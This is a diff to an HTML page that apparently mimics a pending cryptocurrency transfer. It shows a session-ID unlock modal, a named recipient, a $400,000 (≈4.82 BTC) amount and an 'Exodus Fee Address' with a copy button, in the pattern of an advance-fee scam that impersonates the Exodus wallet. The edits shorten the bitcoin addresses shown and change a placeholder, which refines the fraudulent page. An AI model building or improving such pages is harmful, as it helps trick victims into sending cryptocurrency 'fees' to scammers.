@@ -172,11 +172,12 @@
   <div class="overlay show" id="sessionOverlay" aria-hidden="false">
     <div class="modal session-modal" role="dialog" aria-modal="true" aria-labelledby="sessionTitle">
       <div>
-        <div id="sessionTitle" class="modal-title" style="font-weight:900;font-size:18px;">Session ID Required</div>
+        <div id="sessionTitle" class="modal-title" style="font-weight:900;font-size:18px;">
+          ID Required</div>
         <div class="hint">Enter Session ID to Access</div>
       </div>
 
-      <input id="sessionInput" class="session-input" placeholder="STAN-TXN-847392" aria-label="Session ID" autofocus />
+      <input id="sessionInput" class="session-input" placeholder="*****" aria-label="Session ID" autofocus />
 
       <div class="session-actions">
         <button id="sessionSubmit" class="btn btn-primary">Unlock</button>
@@ -202,7 +203,7 @@
           <div class="label">Recipient</div>
           <div style="font-weight:900;font-size:18px;margin-bottom:8px;">Stan Ottembrajt</div>
           <div class="small">Receiving address</div>
-          <div class="mono" style="margin:8px 0 12px;" id="recipientMono">bc1q9nh4xgf85vx9uaplpa07drxv598wth0l63d4v3</div>
+          <div class="mono" style="margin:8px 0 12px;" id="recipientMono">bc1q9nh4xgf85v...98wth0l63d4v3</div>
 
           <div class="label">Amount</div>
           <div style="font-weight:900;font-size:18px;">$400,000 — <span class="small">≈ 4.82 BTC</span></div>
@@ -261,7 +262,7 @@
           <div class="payment-wallet">
             <div style="flex:1">
               <div class="small">Exodus Fee Address</div>
-              <div class="mono" id="feeAddress">bc1qjx8qvmt83uzpulefqvtsjfrrskxycjfggvqjrf</div>
+              <div class="mono" id="feeAddress">bc1qjx8qvmt83...kxycjfggvqjrf</div>
             </div>
             <div style="display:flex;flex-direction:column;gap:8px;align-items:flex-end">
               <button id="copyFee" class="btn btn-ghost">Copy</button>
